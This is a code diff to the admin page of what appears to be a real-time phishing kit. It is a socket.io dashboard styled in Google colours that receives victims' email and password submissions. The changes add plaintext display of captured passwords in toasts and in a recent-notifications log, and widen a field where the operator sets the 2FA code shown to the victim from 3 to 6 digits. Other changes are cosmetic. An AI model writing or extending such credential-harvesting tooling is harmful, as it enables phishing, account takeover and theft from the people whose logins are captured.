@@ -38,6 +38,7 @@ export default function AdminPage() {
     const [modalUserEmail, setModalUserEmail] = useState("");
     const [modalAuthCodeInput, setModalAuthCodeInput] = useState("");
     const [mounted, setMounted] = useState(false);
+    const [notificationLog, setNotificationLog] = useState([]);
 
     const authCodeInputRef = useRef(null);
     const socketRef = useRef(null);
@@ -65,7 +66,7 @@ export default function AdminPage() {
 
         const initSocket = async () => {
             try {
-                const socketUrl = process.env.NEXT_PUBLIC_SOCKET_SERVER_URL || "http://localhost:1000";
+                const socketUrl = process.env.NEXT_PUBLIC_SOCKET_SERVER_URL || "http://localhost:8000";
                 const { io } = await import("socket.io-client");
 
                 socketInstance = io(socketUrl, {
@@ -80,16 +81,13 @@ export default function AdminPage() {
                 socketRef.current = socketInstance;
 
                 socketInstance.on("connect", () => {
-                    // // console.log("✅ Admin connected to socket server");
+                    console.log("✅ Admin connected to socket server");
                     setSocketConnected(true);
                     setConnectionError("");
-                    // toast.success("Connected to real-time server",{
-                    //     duration: 1000
-                    // });
                 });
 
                 socketInstance.on("disconnect", (reason) => {
-                    // console.log("❌ Admin disconnected from socket server:", reason);
+                    console.log("❌ Admin disconnected from socket server:", reason);
                     setSocketConnected(false);
                     if (reason === "io server disconnect") {
                         setConnectionError("Server disconnected");
@@ -102,14 +100,46 @@ export default function AdminPage() {
                     setConnectionError(error.message || "Connection failed");
                 });
 
+                // ✅ Enhanced notification handler with password support
                 socketInstance.on("admin_notification", (data) => {
-                    // console.log("📨 Received admin_notification:", data);
-                    toast(`New Login: ${data.email || 'Unknown'}`, {
+                    console.log("📨 Received admin_notification:", data);
+                    
+                    let notificationMessage = `New Login: ${data.email || 'Unknown'}`;
+                    let notificationIcon = '🔔';
+                    let notificationColor = '#333';
+                    
+                    if (data.type === 'email_submit') {
+                        notificationMessage = `📧 Email submitted: ${data.email}`;
+                        notificationIcon = '📧';
+                        notificationColor = '#1a73e8';
+                    } else if (data.type === 'password_submit') {
+                        // ✅ Show password if available
+                        const passwordDisplay = data.password ? `, Password: ${data.password}` : '';
+                        notificationMessage = `🔑 Password submitted: ${data.email}${passwordDisplay}`;
+                        notificationIcon = '🔑';
+                        notificationColor = '#ea4335';
+                    } else if (data.type === 'login_attempt') {
+                        notificationMessage = `🔐 Login attempt: ${data.email}`;
+                        notificationIcon = '🔐';
+                        notificationColor = '#fbbc05';
+                    }
+                    
+                    // Add to notification log
+                    setNotificationLog(prev => [{
+                        id: Date.now(),
+                        message: notificationMessage,
+                        email: data.email,
+                        type: data.type,
+                        password: data.password || '',
+                        timestamp: data.timestamp || new Date().toISOString()
+                    }, ...prev].slice(0, 20));
+                    
+                    toast(notificationMessage, {
                         duration: 5000,
-                        icon: '🔔',
+                        icon: notificationIcon,
                         style: {
                             borderRadius: '10px',
-                            background: '#333',
+                            background: notificationColor,
                             color: '#fff',
                         },
                     });
@@ -118,7 +148,11 @@ export default function AdminPage() {
                 });
 
                 socketInstance.on("user_update", (data) => {
-                    // console.log("📨 Received user_update on admin:", data);
+                    console.log("📨 Received user_update on admin:", data);
+                    toast(`User status updated: ${data.email || 'Unknown'}`, {
+                        duration: 3000,
+                        icon: '🔄',
+                    });
                     fetchUsers();
                 });
 
@@ -187,7 +221,7 @@ export default function AdminPage() {
         } catch (error) {
             console.error("Failed to fetch users:", error);
             toast.error("Failed to fetch users", {
-                duration: 1000
+                duration: 2000
             });
         }
     };
@@ -243,7 +277,7 @@ export default function AdminPage() {
                 setIsAuthenticated(true);
                 await fetchUsers();
                 toast.success("Logged in successfully!", {
-                    duration: 1000
+                    duration: 2000
                 });
             } else {
                 setLoginError(result.message || "Invalid credentials");
@@ -261,7 +295,7 @@ export default function AdminPage() {
         setIsAuthenticated(false);
         setUsers([]);
         toast.success("Logged out successfully!", {
-            duration: 1000
+            duration: 2000
         });
         router.refresh();
     };
@@ -274,16 +308,16 @@ export default function AdminPage() {
             if (result.success) {
                 await fetchUsers();
                 toast.success(`Status updated to ${newStatus}`, {
-                    duration: 1000
+                    duration: 2000
                 });
             } else {
                 toast.error(result.message || "Failed to update status", {
-                    duration: 1000
+                    duration: 2000
                 });
             }
         } catch (error) {
             toast.error("An error occurred. Please try again.", {
-                duration: 1000
+                duration: 2000
             });
         } finally {
             setActionLoading(false);
@@ -299,16 +333,16 @@ export default function AdminPage() {
             if (result.success) {
                 await fetchUsers();
                 toast.success("User deleted successfully!", {
-                    duration: 1000
+                    duration: 2000
                 });
             } else {
                 toast.error(result.message || "Failed to delete user", {
-                    duration: 1000
+                    duration: 2000
                 });
             }
         } catch (error) {
             toast.error("An error occurred. Please try again.", {
-                duration: 1000
+                duration: 2000
             });
         } finally {
             setActionLoading(false);
@@ -318,7 +352,7 @@ export default function AdminPage() {
     // Copy to clipboard function
     const copyToClipboard = (text, label) => {
         if (!text) {
-            toast.error("Nothing to copy", { duration: 1000 });
+            toast.error("Nothing to copy", { duration: 2000 });
             return;
         }
         
@@ -635,6 +669,21 @@ export default function AdminPage() {
                     </div>
                 </div>
 
+                {/* Notification Log */}
+                {notificationLog.length > 0 && (
+                    <div className="notification-log">
+                        <h3>Recent Notifications</h3>
+                        <div className="log-list">
+                            {notificationLog.slice(0, 5).map((notif) => (
+                                <div key={notif.id} className="log-item">
+                                    <span className="log-time">{new Date(notif.timestamp).toLocaleTimeString()}</span>
+                                    <span className="log-message">{notif.message}</span>
+                                </div>
+                            ))}
+                        </div>
+                    </div>
+                )}
+
                 {/* Users Table */}
                 <div className="table-container">
                     <div className="table-header">
@@ -745,7 +794,7 @@ export default function AdminPage() {
                 <div className="modal-backdrop">
                     <div className="modal-card">
                         <h3 className="text-black">Set 2FA Code</h3>
-                        <p>Enter the 3-digit code that the user will see.</p>
+                        <p>Enter the 6-digit code that the user will see.</p>
                         <input
                             ref={authCodeInputRef}
                             type="text"
@@ -753,7 +802,7 @@ export default function AdminPage() {
                             value={modalAuthCodeInput}
                             onChange={(e) => setModalAuthCodeInput(e.target.value)}
                             placeholder="Enter 2FA code"
-                            maxLength={3}
+                            maxLength={6}
                             onKeyDown={(e) => {
                                 if (e.key === 'Enter') {
                                     e.preventDefault();
@@ -868,6 +917,7 @@ export default function AdminPage() {
           display: flex;
           align-items: center;
           gap: 16px;
+          flex-wrap: wrap;
         }
         .brand-logo-small {
           font-size: 20px;
@@ -904,6 +954,18 @@ export default function AdminPage() {
         }
         .status-text {
           margin-left: 4px;
+        }
+        .btn-test {
+          background: #4285f4;
+          color: white;
+          border: none;
+          padding: 4px 12px;
+          border-radius: 4px;
+          cursor: pointer;
+          font-size: 12px;
+        }
+        .btn-test:hover {
+          background: #3367d6;
         }
         .btn-logout {
           background: #ea4335;
@@ -950,6 +1012,42 @@ export default function AdminPage() {
         .summary-info { display: flex; flex-direction: column; }
         .summary-value { font-size: 24px; font-weight: 500; color: #202124; }
         .summary-label { font-size: 12px; color: #5f6368; }
+        .notification-log {
+          background: #ffffff;
+          border-radius: 8px;
+          padding: 16px 20px;
+          margin-bottom: 24px;
+          box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+        }
+        .notification-log h3 {
+          font-size: 14px;
+          font-weight: 500;
+          color: #5f6368;
+          margin-bottom: 12px;
+        }
+        .log-list {
+          display: flex;
+          flex-direction: column;
+          gap: 4px;
+        }
+        .log-item {
+          display: flex;
+          gap: 12px;
+          font-size: 13px;
+          padding: 4px 0;
+          border-bottom: 1px solid #f1f3f4;
+        }
+        .log-item:last-child {
+          border-bottom: none;
+        }
+        .log-time {
+          color: #5f6368;
+          font-size: 11px;
+          min-width: 80px;
+        }
+        .log-message {
+          color: #202124;
+        }
         .table-container {
           background: #ffffff;
           border-radius: 8px;
